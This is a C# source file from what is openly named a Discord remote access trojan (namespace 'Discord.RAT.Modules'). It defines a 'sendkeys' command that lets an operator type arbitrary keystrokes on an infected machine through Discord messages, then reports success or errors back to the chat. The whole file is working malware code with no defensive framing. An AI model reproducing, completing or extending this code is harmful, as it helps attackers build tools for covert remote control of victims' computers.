using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Discord.RAT.Modules
{
    public class KeySender : ModuleBase
    {
        [Command("sendkeys", RunMode = RunMode.Async)]

        public async Task Send([Remainder] string text)
        {
            await ReplyAsync("Sending..!");
            try
            {
                SendKeys.SendWait(text);
            }
            catch (Exception ex)
            {
                await ReplyAsync("Couldn't send " + text + " Reason: " + ex.Message);
            }


        }
    }
}
